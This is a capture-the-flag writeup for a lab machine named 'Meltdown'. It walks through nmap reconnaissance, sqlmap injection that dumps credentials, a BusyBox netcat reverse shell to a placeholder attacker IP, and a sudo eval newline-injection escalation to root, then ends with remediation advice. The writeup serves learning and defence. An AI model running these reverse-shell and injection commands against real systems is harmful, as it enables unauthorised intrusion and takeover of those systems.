# 🧊 Meltdown — CTF Writeup

**Difficulty:** Easy
**Target IP:** 192.168.1.114
**Flags:**
- 🧑 User: `flag{user-86e507f360df4e80b63234f051c99a6e}`
- 👑 Root: `flag{root-3508528e639741db9ee8ba82ff66318b}`

---

## 📡 Phase 1 — Reconnaissance

### Nmap Scan

```bash
nmap -sV -sC 192.168.1.114
```

**Results:**

| Port | State | Service | Version |
|------|-------|---------|---------|
| 22/tcp | open | SSH | OpenSSH 8.4p1 Debian |
| 80/tcp | open | HTTP | Apache httpd 2.4.62 |

**Key observations:**
- Only **2 ports** exposed
- HTTP service running Apache on port 80
- `PHPSESSID` cookie missing the `httponly` flag — a minor but noteworthy misconfiguration
- Page title is in **Chinese** (炉心融解), hinting at a themed machine

---

## 🌐 Phase 2 — Web Enumeration

Navigating to `http://192.168.1.114` revealed a **login page**.

Using **Burp Suite**, the login request was intercepted and analyzed. The request structure looked suspicious, suggesting a potential **SQL injection** vulnerability in the authentication form.

### SQLMap — SQL Injection

The captured request was fed into `sqlmap`:

```bash
sqlmap -r request.txt --dbs
sqlmap -r request.txt -D <database> --tables
sqlmap -r request.txt -D <database> -T users --dump
```

**Discovered credentials from the `users` table:**

| Username | Password |
|----------|----------|
| `rin` | `rin123` |

---

## 🔑 Phase 3 — Authenticated Access & RCE Discovery

After logging in with `rin:rin123`, navigation led to **`rin_page.php`**, which contained interesting functionality — a parameter that appeared to reflect user input.

Further exploration revealed **`item.php`** with an `id` parameter. Testing with `curl`:

```bash
curl http://192.168.1.114/item.php?id=1
```

The response leaked server output, confirming **Remote Code Execution (RCE)**. The web server was running as `www-data`.

---

## 🐚 Phase 4 — Reverse Shell

With RCE confirmed, a reverse shell was established using **BusyBox**:

```bash
# On attacker machine — start listener
nc -lvnp 4444

# Via RCE — trigger reverse shell
busybox nc <ATTACKER_IP> 4444 -e /bin/bash
```

Shell obtained as `www-data`. ✅

---

## ⬆️ Phase 5 — Privilege Escalation

### Step 1 — Credential Discovery

While exploring the filesystem, a plaintext credential file was found:

```bash
cat /opt/passwd.txt
```

```
rin:b59a85af917afd07
```

SSH login was used to upgrade to a stable shell:

```bash
ssh rin@192.168.1.114
# password: b59a85af917afd07
```

**User flag obtained:**

```
flag{user-86e507f360df4e80b63234f051c99a6e}
```

---

### Step 2 — Sudo Enumeration

```bash
sudo -l
```

```
(root) NOPASSWD: /opt/repeater.sh
```

The script `/opt/repeater.sh` could be run as **root with no password**. Time to analyze it.

---

### Step 3 — Analyzing repeater.sh

```bash
#!/bin/bash

main() {
    local user_input="$1"

    # Block special shell chars
    if echo "$user_input" | grep -qE '[;&|`$\\]'; then
        echo "错误：输入包含非法字符"
        return 1
    fi

    # Block dangerous keywords
    if echo "$user_input" | grep -qiE '(cat|ls|echo|rm|mv|cp|chmod)'; then
        echo "错误：输入包含危险关键字"
        return 1
    fi

    # Restrict space usage
    if echo "$user_input" | grep -qE '[[:space:]]'; then
        if ! echo "$user_input" | grep -qE '^[a-zA-Z0-9]*[[:space:]]+[a-zA-Z0-9]*$'; then
            echo "错误：空格使用受限"
            return 1
        fi
    fi

    echo "处理结果: $user_input"

    local sanitized_input=$(echo "$user_input" | tr -d '\n\r')
    eval "output=\"$sanitized_input\""   # ⚠️ VULNERABLE LINE
    echo "最终输出: $output"
}
```

### 🔍 Vulnerability Analysis

The script attempts to sanitize input by blocking:
- Shell metacharacters: `;`, `&`, `|`, `` ` ``, `$`, `\`
- Dangerous commands: `cat`, `ls`, `echo`, etc.
- Unrestricted spaces

**However**, the critical flaw is on this line:

```bash
eval "output=\"$sanitized_input\""
```

The `eval` statement wraps the input in **double quotes**, but **newlines are not treated as metacharacters by the filter**. By injecting a **newline** directly into the argument (using shell `$'...'` quoting or interactive multi-line input), the `eval` interprets the newline as a **command separator**, escaping the double-quote context and executing arbitrary commands.

---

### Step 4 — Exploitation

The bypass was achieved by passing a multi-line argument that breaks out of the `eval` double-quote context:

```bash
sudo /opt/repeater.sh '"
>  bash
> "'
```

**What happens internally:**

```bash
eval "output="      # closes the assignment
bash                # executes bash as root!
""                  # empty string, harmless
```

The `eval` sees the newline as a separator, the assignment closes early, and `bash` is executed — **spawning a root shell**. 🎉

```
root@meltdown:/home/rin#
```

**Root flag obtained:**

```bash
cat /root/root.txt
flag{root-3508528e639741db9ee8ba82ff66318b}
```

---

## 🗺️ Attack Chain Summary

```
Nmap Scan
    └── Port 80 (HTTP)
            └── Login Page
                    └── SQL Injection (SQLMap)
                            └── Credentials: rin:rin123
                                    └── rin_page.php / item.php
                                            └── RCE via GET parameter
                                                    └── Reverse Shell (www-data)
                                                            └── /opt/passwd.txt
                                                                    └── SSH as rin
                                                                            └── sudo repeater.sh
                                                                                    └── eval newline injection
                                                                                            └── ROOT SHELL 🏆
```

---

## 🛡️ Remediation Recommendations

| Vulnerability | Fix |
|---------------|-----|
| SQL Injection | Use **prepared statements / parameterized queries** |
| RCE via GET param | Validate and sanitize all user-controlled input server-side |
| Plaintext credentials in `/opt/passwd.txt` | Remove credentials from filesystem; use a secrets manager |
| `httponly` missing on `PHPSESSID` | Set `session.cookie_httponly = 1` in `php.ini` |
| `eval` in bash script | **Never use `eval` with user input**; redesign script logic entirely |
| NOPASSWD sudo on custom script | Restrict sudo rules; avoid NOPASSWD for scripts that process user input |

---

> ✍️ *Writeup by Tomash | Room: Meltdown | Difficulty: Easy*